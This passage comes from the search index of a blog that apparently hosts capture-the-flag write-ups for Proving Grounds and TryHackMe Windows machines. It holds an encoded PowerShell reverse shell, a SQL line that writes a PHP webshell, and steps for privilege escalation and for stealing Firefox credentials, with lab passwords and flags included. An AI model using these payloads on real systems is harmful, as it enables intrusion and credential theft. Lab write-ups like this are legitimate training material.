\ud83d\udd39","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"mice/#enumeration","title":"Enumeration","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"mice/#initial-access","title":"Initial Access","text":"<p>We find an exploit for <code>remotemouse</code>: https://github.com/p0dalirius/RemoteMouse-3.008-Exploit</p> <p>I executed this in two parts: first, get a reverse shell from <code>httpserver</code> and then execute it.</p> <p> </p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"mice/#privilege-escalation","title":"Privilege Escalation","text":"<p>Searching in the home folder, we find a <code>filezilla</code> base64 password.</p> <p> </p> <p><code>ControlFreak11</code></p> <p>This user belongs to <code>remote users</code>, so maybe we can access it using <code>xfreerdp</code>.</p> <p> </p> <p><code>remotemouse</code> is running with admin privileges, so open it from the task manager, go to settings, and change...</p> <p></p> <p>In the folder dialog, put <code>cmd</code> in the search bar.</p> <p> </p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"mice/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"monster/","title":"Monster \ud83d\udd39","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"monster/#enumeration","title":"Enumeration","text":"<p>Web server.</p> <p></p> <p>Using <code>feroxbuster</code>, we discover a blog by <code>monstra 3.0.4</code>.</p> <p></p> <p>And the admin panel.</p> <p></p> <p>Add <code>monster.pg</code> to <code>/etc/hosts</code>.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"monster/#initial-access","title":"Initial Access","text":"<p>Trying password, we enter with <code>admin:wazowski</code>.</p> <p></p> <p>Using <code>searchsploit</code>.</p> <p></p> <p>We get <code>52038.py</code> but we have to edit it and give it indentation.</p> <p></p> <p>Going to that URL, we see the webshell.</p> <p></p> <p>Putting an encoded PowerShell reverse shell and starting a listener, we get a reverse shell.</p> <pre><code>powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA2ACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbmRgYnl0ZSwAMAAsACQAc2VuZGJ5dGUuTGVuZ3RoKTsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==\n</code></pre> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"monster/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get local flag.</p> <p></p> <p></p> <p></p> <p>Transfer the script after generating an <code>msfvenom</code> reverse shell and change the path to it in the script.</p> <p></p> <p>Wait after executing it and...</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"monster/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p>328bcdxxxxxxxxxxxb243c8a8e6</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"nickel/","title":"Nickel \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"nickel/#enumeration","title":"Enumeration","text":"<p>DevOps dashboard at port <code>8089</code>.</p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"nickel/#initial-access","title":"Initial Access","text":"<p>These options call port <code>3333</code> with an invalid token response, but if we change it to POST, we have a response.</p> <p></p> <p>Password is in base64 -&gt; <code>NowiseSloopTheory139</code></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"nickel/#privilege-escalation","title":"Privilege Escalation","text":"<p>Get PDF from <code>ftp</code>.</p> <p></p> <p>It's protected. Using <code>pdf2john</code> and <code>john</code>:</p> <p></p> <p></p> <p></p> <p>Using <code>netstat</code>, we can see that there is a port <code>80</code> open on the inside.</p> <p>Port forward using <code>ssh</code>.</p> <p></p> <p></p> <p>Using the PDF commands.</p> <p></p> <p>Let's put a reverse shell.</p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"nickel/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"shenzi/","title":"Shenzi \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"shenzi/#enumeration","title":"Enumeration","text":"<p>Port <code>80</code> shows a <code>xampp</code> page.</p> <p></p> <p>We can enumerate <code>smb</code> and get some interesting files.</p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"shenzi/#initial-access","title":"Initial Access","text":"<p>We need the <code>wordpress</code> path, trying <code>shenzi</code>.</p> <p></p> <p>We can log in with credentials, then edit the <code>404</code> theme page and put a PHP reverse shell, go to a wrong page and...</p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"shenzi/#privilege-escalation","title":"Privilege Escalation","text":"<p>Transfer <code>winpeas</code> and discover \"always install elevated\" misconfiguration.</p> <p></p> <p>Make a reverse shell and transfer it to the host.</p> <p></p> <p>Then execute it.</p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"shenzi/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"slort/","title":"Slort \ud83d\udd38","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"slort/#enumeration","title":"Enumeration","text":"<p>Using <code>feroxbuster</code>, we discover a <code>/site</code> website.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"slort/#initial-access","title":"Initial Access","text":"<p>The URL has an RFI vulnerability, so we can call a reverse shell.</p> <p></p> <p></p> <p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"slort/#privilege-escalation","title":"Privilege Escalation","text":"<p>There is a backup folder with <code>TFTP.EXE</code> inside and an <code>info.txt</code> that says that <code>tftp</code> will be executed every 5 minutes, and <code>rupert</code> can edit all. So generate a reverse shell and replace the binary, reboot the system, and wait 5 minutes.</p> <p></p> <p></p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"slort/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"squid/","title":"Squid \ud83d\udd39","text":"","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"squid/#enumeration","title":"Enumeration","text":"<p>Page at port <code>3128</code> is the <code>squid</code> proxy error page.</p> <p></p> <p>We can connect to the proxy for discovering more ports. We can use https://github.com/aancw/spose.</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Desktop/spose]\n\u2514\u2500$ python3 spose.py --proxy http://192.168.120.223:3128 --target 127.0.0.1\nUsing proxy address http://192.168.120.223:3128\n127.0.0.1 3306 seems OPEN \n127.0.0.1 8080 seems OPEN  \n</code></pre> <p>A <code>mysql</code> service and a <code>wamp</code> service. We can access the <code>wamp</code> one with <code>foxyproxy</code>.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"squid/#initial-access","title":"Initial Access","text":"<p>Now, accessing port <code>8080</code>, we can see the apps. Trying <code>root</code> with <code>phpmyadmin</code>.</p> <p></p> <p>Put a PHP shell:</p> <pre><code>SELECT '&lt;?php system($_GET[\"cmd\"]); ?&gt;' INTO OUTFILE 'C:/wamp/www/wshell.php';\n</code></pre> <p>And it can be accessed in the root.</p> <p>So we can put an encoded PowerShell reverse shell and...</p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"squid/#privilege-escalation","title":"Privilege Escalation","text":"<p>We have restricted permissions. From this resource, we find out that when a <code>LOCAL SERVICE</code> or <code>NETWORK SERVICE</code> is configured to run with a restricted set of privileges, permissions can be recovered by creating a <code>scheduled task</code>. The new process created by the <code>Task Scheduler Service</code> will have all the default privileges of the associated user account.</p> <p>So, first, create a task:</p> <p></p> <p></p> <p></p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"squid/#post-exploitation","title":"Post Exploitation","text":"<p>Get the flag.</p> <p></p>","tags":["\ud83d\udcce Windows","\u2694\ufe0f Proving Grounds","Proving Grounds","Windows"]},{"location":"gatekeeper/","title":"Gatekeeper","text":"","tags":["\ud83d\udcce Windows","\ud83e\udd16 TryHackMe","TryHackMe","Windows"]},{"location":"gatekeeper/#enumeration","title":"Enumeration","text":"<pre><code>$ nmap -sC -Pn -T4 --min-rate 1000 -p- 10.10.249.16 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 00:47 CET\nNmap scan report for 10.10.249.16\nHost is up (0.076s latency).\nNot shown: 65524 closed tcp ports (reset)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n| ssl-cert: Subject: commonName=gatekeeper\n| Not valid before: 2024-11-15T22:51:11\n|_Not valid after:  2025-05-17T22:51:11\n31337/tcp open  Elite\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49160/tcp open  unknown\n49161/tcp open  unknown\n49162/tcp open  unknown\n\nHost script results:\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional \n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: gatekeeper\n|   NetBIOS computer name: GATEKEEPER\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2024-11-16T18:14:30-05:00\n| smb2-time: \n|   date: 2024-11-16T23:14:30\n|_  start_date: 2024-11-16T22:50:40\n|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 0\n|_clock-skew: mean: 1h04m59s, deviation: 2h53m12s, median: -35m01s\n| smb2-security-mode: \n|   2:1:0: \n|_    Message signing enabled but not required\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n\nNmap done: 1 IP address (1 host up) scanned in 195.76 seconds\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83e\udd16 TryHackMe","TryHackMe","Windows"]},{"location":"gatekeeper/#initial-access","title":"Initial Access","text":"<p><code>nc 10.10.249.16 31337</code> reveals a program that echoes anything we enter. If we input a large number of <code>A</code>s, it crashes, indicating this is a buffer overflow machine. We need to retrieve the program, so let's try accessing SMB shares without credentials.</p> <pre><code>$ smbclient --no-pass -L //10.10.249.16          \nPassword for [WORKGROUP\\kali]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        Users           Disk      \n\n$ smbclient --no-pass //10.10.249.16/Users\nTry \"help\" to get a list of possible commands.\n\nsmb: \\&gt; ls\n  .                                  DR        0  Fri May 15 03:57:08 2020\n  ..                                 DR        0  Fri May 15 03:57:08 2020\n  Default                           DHR        0  Tue Jul 14 09:07:31 2009\n  desktop.ini                       AHS      174  Tue Jul 14 06:54:24 2009\n  Share                               D        0  Fri May 15 03:58:07 2020\n\nsmb: \\&gt; cd Share\nsmb: \\Share\\&gt; ls\n  .                                   D        0  Fri May 15 03:58:07 2020\n  ..                                  D        0  Fri May 15 03:58:07 2020\n  gatekeeper.exe                      A    13312  Mon Apr 20 07:27:17 2020\n\n                7863807 blocks of size 4096. 3984765 blocks available\nsmb: \\Share\\&gt; get gatekeeper.exe\ngetting file \\Share\\gatekeeper.exe of size 13312 as gatekeeper.exe (22.5 KiloBytes/sec) (average 14.9 KiloBytes/sec)\nsmb: \\Share\\&gt; exit\n</code></pre> <p>We have the file. Now, create the exploit on a Win32 machine.</p> <ul> <li>offset -&gt; <code>146</code></li> <li>bad chars -&gt; <code>0x00</code>, <code>0x0A</code></li> <li>jump address -&gt; <code>080414C3</code></li> </ul> <p>Now we can retrieve the user flag.</p>","tags":["\ud83d\udcce Windows","\ud83e\udd16 TryHackMe","TryHackMe","Windows"]},{"location":"gatekeeper/#privilege-escalation","title":"Privilege Escalation","text":"<p>We find a <code>Firefox.lnk</code> file in the user's desktop folder, so we attempt to extract credentials from Firefox. Navigate to <code>C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles</code>.</p> <p>On Kali, create an SMB share with <code>impacket-smbserver -smb2support -user 'test' -password 'test' kali \\</code>pwd``.</p> <p>Copy the profile folder to Kali:</p> <pre><code>copy lfjfn812a.default-release z:\\\n</code></pre> <p>Next, install <code>firefox_decrypt</code>:</p> <pre><code>git clone https://github.com/unode/firefox_decrypt.git\n\npython3 firefox_decrypt.py /home/kali\n2024-11-17 17:44:37,595 - WARNING - profile.ini not found in /home/kali\n2024-11-17 17:44:37,595 - WARNING - Continuing and assuming '/home/kali' is a profile location\n\nWebsite:   https://creds.com\nUsername: 'mayor'\nPassword: '8CL7O1N78MdrCIsV'\n</code></pre> <p>With these credentials, we try <code>nxc</code>:</p> <pre><code>nxc smb 10.10.92.113 -u 'mayor' -p '8CL7O1N78MdrCIsV'\nSMB         10.10.92.113    445    GATEKEEPER       [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:GATEKEEPER) (domain:gatekeeper) (signing:False) (SMBv1:True)\nSMB         10.10.92.113    445    GATEKEEPER       [+] gatekeeper\\mayor:8CL7O1N78MdrCIsV (Pwn3d!)\n</code></pre> <p>Using <code>impacket-psexec</code>:</p> <pre><code>$ impacket-psexec 'mayor':'8CL7O1N78MdrCIsV'@10.10.92.113 \nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on 10.10.92.113.....\n[*] Found writable share ADMIN$\n[*] Uploading file FMkKbYVP.exe\n[*] Opening SVCManager on 10.10.92.113.....\n[*] Creating service aYIa on 10.10.92.113.....\n[*] Starting service aYIa.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Windows\\system32&gt; whoami\nnt authority\\system\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83e\udd16 TryHackMe","TryHackMe","Windows"]},{"location":"gatekeeper/#post-exploitation","title":"Post Exploitation","text":"<pre><code>C:\\Windows\\system32&gt; cd C:\\Users\\mayor\\desktop\n\nC:\\Users\\mayor\\Desktop&gt; dir\n Volume in drive C has no label.\n Volume Serial Number is 3ABE-D44B\n\n Directory of C:\\Users\\mayor\\Desktop\n\n05/14/2020  08:58 PM    &lt;DIR&gt;          .\n05/14/2020  08:58 PM    &lt;DIR&gt;          ..\n05/14/2020  08:21 PM                27 root.txt.txt\n               1 File(s)             27 bytes\n               2 Dir(s)  16,385,642,496 bytes free\n\nC:\\Users\\mayor\\Desktop&gt; type root.txt.txt\n{Th3_M4y0r_C0ngr4tul4t3s_U}\n</code></pre>","tags":["\ud83d\udcce Windows","\ud83e\udd16 TryHackMe","TryHackMe","Windows"]},{"location":"archive/2025/","title":"2025","text":""},{"location":"archive/2024/","title":"2024","text":""},{"location":"category/hackthebox/","title":"HackTheBox","text":""},{"location":"category/linux/","title":"Linux","text":""},{"location":"category/active-directory/","title":"Active Directory","text":""},{"location":"category/windows/","title":"Windows","text":""},{"location":"category/proving-grounds/","title":"Proving Grounds","text":""},{"location":"category/tryhackme/","title":"TryHackMe","text":""},{"location":"page/2/","title":"Home","text":""},{"location":"page/3/","title":"Home","text":""},{"location":"page/4/","title":"Home","text":""},{"location":"page/5/","title":"Home","text":""},{"location":"page/6/","title":"Home","text":""},{"location":"page/7/","title":"Home","text":""},{"location":"page/8/","title":"Home","text":""},{"location":"page/9/","title":"Home","text":""},{"location":"page/10/","title":"Home","text":""},{"location":"page/11/","title":"Home","text":""},{"location":"page/12/","title":"Home","text":""},{"location":"archive/2025/page/2/","title":"2025","text":""},{"location":"archive/2025/page/3/","title":"2025","text":""},{"location":"archive/2025/page/4/","title":"2025","text":""},{"location":"archive/2025/page/5/","title":"2025","text":""},{"location":"archive/2025/page/6/","title":"2025","text":""},{"location":"archive/2025/page/7/","title":"2025","text":""},{"location":"archive/2025/page/8/","title":"2025","text":""},{"location":"archive/2025/page/9/","title":"2025","text":""},{"location":"archive/2025/page/10/","title":"2025","text":""},{"location":"archive/2025/page/11/","title":"2025","text":""},{"location":"category/active-directory/page/2/","title":"Active Directory","text":""},{"location":"category/active-directory/page/3/","title":"Active Directory","text":""},{"location":"category/hackthebox/page/2/","title":"HackTheBox","text":""},{"location":"category/hackthebox/page/3/","title":"HackTheBox","text":""},{"location":"category/hackthebox/page/4/","title":"HackTheBox","text":""},{"location":"category/hackthebox/page/5/","title":"HackTheBox","text":""},{"location":"category/linux/page/2/","title":"Linux","text":""},{"location":"category/linux/page/3/","title":"Linux","text":""},{"location":"category/linux/page/4/","title":"Linux","text":""},{"location":"category/linux/page/5/","title":"Linux","text":""},{"location":"category/linux/page/6/","title":"Linux","text":""},{"location":"category/proving-grounds/page/2/","title":"Proving Grounds","text":""},{"location":"category/proving-grounds/page/3/","title":"Proving Grounds","text":""},{"location":"category/proving-grounds/page/4/","title":"Proving Grounds","text":""},{"location":"category/proving-grounds/page/5/","title":"Proving Grounds","text":""},{"location":"category/proving-grounds/page/6/","title":"Proving Grounds","text":""},{"location":"category/proving-grounds/page/7/","title":"Proving Grounds","text":""},{"location":"category/windows/page/2/","title":"Windows","text":""},{"location":"category/windows/page/3/","title":"Windows","text":""}]}